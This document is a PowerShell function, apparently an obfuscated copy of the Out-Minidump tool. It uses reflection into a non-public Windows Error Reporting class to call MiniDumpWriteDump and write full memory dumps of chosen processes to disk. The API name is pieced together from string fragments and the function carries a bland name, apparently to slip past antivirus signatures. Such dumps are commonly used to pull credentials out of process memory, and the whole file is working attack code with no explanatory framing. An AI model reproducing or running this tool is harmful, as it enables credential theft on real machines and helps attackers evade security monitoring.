function Out-fun
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(Position = 1)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $Dhp = $PWD
    )
    BEGIN
    {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Fs = [Reflection.BindingFlags] 'NonPublic, Static'
    $h="Dump"
    $h1="Wri"
    $h2="te"
    $hi="Dump"
    $j="Mini"
    $hii=$j+$hi+$h1+$h2+$h
        $mdw = $WERNativeMethods.GetMethod($hii, $Fs)
        $mdf = [UInt32] 2
    }
    PROCESS
    {
        $PId = $Process.Id
        $PName = $Process.Name
        $PHandle = $Process.Handle
        $PFName = "$($PName)_$($PId).dmp"

        $PP = Join-Path $Dhp $PFName

        $FS = New-Object IO.FileStream($PP, [IO.FileMode]::Create)

        $Res = $mdw.Invoke($null, @($PHandle,
                                                     $PId,
                                                     $FS.SafeFileHandle,
                                                     $mdf,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FS.Close()
        if (-not $Res)
        {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcName):$($PId))"
            Remove-Item $PP -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
        else
        {
            Get-ChildItem $PP
        }
    }
    END {}
}
